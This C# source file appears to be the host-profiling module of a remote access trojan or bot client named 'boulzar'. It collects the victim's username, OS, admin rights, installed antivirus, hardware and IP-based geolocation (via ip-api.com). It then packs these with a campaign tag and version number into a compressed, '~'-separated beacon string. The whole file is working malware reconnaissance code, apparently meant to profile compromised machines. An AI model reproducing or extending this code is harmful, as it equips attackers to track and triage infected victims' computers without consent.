using boulzar.Other;
using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.Serialization.Json;
using System.Security.Principal;
using System.Text;



namespace boulzar.Methods
{
    public static class Information
    {
        public static GeoInfo GeoInfo { get; private set; }
        public static string Inffou;
        public static ManagementObjectSearcher objvide = new ManagementObjectSearcher("select * from Win32_VideoController");
        public static string BasicInfo()
        {
            GetGeoInfo();
            string all = "";
            string sep = "~";

            all += Csettings.Tag + sep;
            all += Environment.UserName + sep;
            all += OperatingSys() + sep;
            all += GeoInfo.Country + "/" + GeoInfo.City + sep;
            all += Csettings.VersionNumber + sep;
            all += IsAdministrator() + sep;
            all += GeoInfo.CountryCode + sep;
            all += GeoInfo.Ip;


            return Helpers.CompressString(all);


        }
        #region Basic info functions
        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }
        public static string Setup()
        {
            try
            {
                return Csettings.Tag + Environment.UserName + OperatingSys() + GeoInfo.Country + "/" + GeoInfo.City + Csettings.VersionNumber +
          IsAdministrator() + GeoInfo.CountryCode + GeoInfo.Ip;
            }
            catch (Exception ex)
            {
                return null;
            }
        }

        public static string OperatingSys()
        {
            string osName;
            RegistryKey key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
            osName = (string)key.GetValue("productName");
            return osName;
        }
        public static string getgpu()
        {
            string gpu = "";


            foreach (ManagementObject obj in objvide.Get())
            {
                gpu += obj["Name"];
            }
            return gpu;
        }
        public static string GetAntivirus()
        {
            try
            {
                string Name = string.Empty;
                bool WinDefend = false;
                string Path = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                using (ManagementObjectSearcher MOS =
                    new ManagementObjectSearcher(Path, "SELECT * FROM AntivirusProduct"))
                {
                    foreach (var Instance in MOS.Get())
                    {
                        if (Instance.GetPropertyValue("displayName").ToString() == "Windows Defender")
                            WinDefend = true;
                        if (Instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                            Name = Instance.GetPropertyValue("displayName").ToString();
                    }

                    if (Name == string.Empty && WinDefend)
                        Name = "Windows Defender";
                    if (Name == "")
                        Name = "N/A";
                    return Name;
                }
            }
            catch
            {
                return "N/A";
            }
        }
        public static string GetCPU()
        {
            try
            {
                string Name = string.Empty;
                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("SELECT * FROM Win32_Processor"))
                {
                    foreach (ManagementObject MO in MOS.Get()) Name += MO["Name"] + "; ";
                }

                Name = RemoveLastChars(Name);
                return !string.IsNullOrEmpty(Name) ? Name : "N/A";
            }
            catch { }

            return "N/A";
        }
        public static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public static void GetGeoInfo()
        {
            try
            {
                DataContractJsonSerializer JS = new DataContractJsonSerializer(typeof(GeoInfo));
                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create("http://ip-api.com/json/");
                Request.UserAgent = "Mozilla/5.0 (Windows NT 6.3; rv:48.0) Gecko/20100101 Firefox/48.0";
                Request.Proxy = null;
                Request.Timeout = 10000;
                using (HttpWebResponse Response = (HttpWebResponse)Request.GetResponse())
                {
                    using (Stream DS = Response.GetResponseStream())
                    {
                        using (StreamReader Reader = new StreamReader(DS))
                        {
                            string ResponseString = Reader.ReadToEnd();
                            using (MemoryStream MS = new MemoryStream(Encoding.UTF8.GetBytes(ResponseString)))
                            {
                                GeoInfo = (GeoInfo)JS.ReadObject(MS);

                            }
                        }
                    }
                }
                GeoInfo.Ip = string.IsNullOrEmpty(GeoInfo.Ip) ? "N/A" : GeoInfo.Ip;
                GeoInfo.Country = string.IsNullOrEmpty(GeoInfo.Country) ? "N/A" : GeoInfo.Country;
                GeoInfo.CountryCode = string.IsNullOrEmpty(GeoInfo.CountryCode) ? "-" : GeoInfo.CountryCode;
                GeoInfo.Region = string.IsNullOrEmpty(GeoInfo.Region) ? "N/A" : GeoInfo.Region;
                GeoInfo.City = string.IsNullOrEmpty(GeoInfo.City) ? "N/A" : GeoInfo.City;
                GeoInfo.Timezone = string.IsNullOrEmpty(GeoInfo.Timezone) ? "N/A" : GeoInfo.Timezone;
                GeoInfo.Isp = string.IsNullOrEmpty(GeoInfo.Isp) ? "N/A" : GeoInfo.Isp;
            }
            catch (Exception ex)
            {
                GeoInfo.Ip = "N/A";
                GeoInfo.Country = "N/A";
                GeoInfo.CountryCode = "N/A";
                GeoInfo.Region = "N/A";
                GeoInfo.City = "N/A";
                GeoInfo.Timezone = "N/A";
                GeoInfo.Isp = "N/A";
                Helpers.SendError(ex);
            }


        }


        #endregion
        #region Information

        public static string ShowSystemInformation()
        {

            string source = Helpers.DecompressString(Properties.Resources.source);




            OperatingSystem os = Environment.OSVersion;
            Version ver = os.Version;

            source = source.Replace("<name>", OperatingSys());
            source = source.Replace("<version>", os.Version.ToString());
            source = source.Replace("<versionstr>", os.VersionString.ToString());
            source = source.Replace("<PLATFORM>", os.Platform.ToString());
            source = source.Replace("<maj_version>", ver.Major.ToString());
            source = source.Replace("<build_version>", ver.Build.ToString());
            source = source.Replace(" <iobit64>", Environment.Is64BitOperatingSystem.ToString());



            using (ManagementObjectSearcher win32Proc = new ManagementObjectSearcher("select * from Win32_Processor"),
    win32CompSys = new ManagementObjectSearcher("select * from Win32_ComputerSystem"),
        win32Memory = new ManagementObjectSearcher("select * from Win32_PhysicalMemory"))
            {
                foreach (ManagementObject obj in win32Proc.Get())
                {
                    source = source.Replace("<m_name>", Environment.MachineName);
                    source = source.Replace("<CPU_NAME>", obj["Name"].ToString());
                    source = source.Replace("<CPU_CLOCK>", obj["MaxClockSpeed"].ToString());
                    source = source.Replace("<CPU_Manufac>", obj["Manufacturer"].ToString());
                    source = source.Replace("<CPU_BITVERSION>", Environment.Is64BitProcess.ToString());
                    source = source.Replace("<CPU_COUNT>", Environment.ProcessorCount.ToString());

                }

                ObjectQuery wql = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wql);
                ManagementObjectCollection results = searcher.Get();

                double res;

                foreach (ManagementObject result in results)
                {
                    res = Convert.ToDouble(result["TotalVisibleMemorySize"]);
                    double fres = Math.Round((res / (1024 * 1024)), 2);

                    source = source.Replace("<RAM_AMOUNT>", fres.ToString());

                }
                ManagementObjectSearcher objvide = new ManagementObjectSearcher("select * from Win32_VideoController");

                foreach (ManagementObject obj in objvide.Get())
                {

                    source = source.Replace("<GPU_NAME>", obj["Name"].ToString());
                    source = source.Replace("<GPU_RAM>", Helpers.ToFileSize(Convert.ToInt64(obj["AdapterRAM"])));

                }

                // GEO locations

                source = source.Replace("<IP_ADD>", GeoInfo.Ip);
                source = source.Replace("<COUNTRY>", GeoInfo.Country);
                source = source.Replace("<COUNTRY_CODE>", GeoInfo.CountryCode);
                source = source.Replace("<REGION>", GeoInfo.Region);
                source = source.Replace("<NAME>", GeoInfo.RegionName);
                source = source.Replace("<CITY>", GeoInfo.City);
                source = source.Replace("<ZIP_CODE>", GeoInfo.Zip);
                source = source.Replace("<LAT>", GeoInfo.Lat.ToString());
                source = source.Replace("<LONG>", GeoInfo.Lon.ToString());
                source = source.Replace("<TIMEZONE>", GeoInfo.Timezone);
                source = source.Replace("<ISP>", GeoInfo.Isp);




            }

            return source;
            #endregion
        }
    }

}
